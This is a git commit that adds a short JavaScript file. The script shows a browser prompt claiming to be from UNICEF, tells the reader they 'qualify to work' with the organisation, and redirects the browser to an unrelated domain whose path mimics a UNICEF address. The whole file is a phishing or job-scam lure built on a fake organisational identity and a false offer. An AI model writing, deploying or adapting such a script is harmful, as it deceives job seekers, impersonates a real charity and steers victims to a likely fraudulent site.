252c41718292152e6fe735a17d5a692287dc060d
ekpesense <abantak9@gmail.com>
2025-03-09 22:59:32 -0700

    Create activation-apply-on-unicef.js

---
+++ activation-apply-on-unicef.js
@@ -0,0 +1,7 @@
+
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations You are qualify to work with the UNITED NATION CHILDREN FUND (UNICEF), Kindly Press OK to submit apllication   ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://offer-fest.info/apply-on-unicef.org';
+}
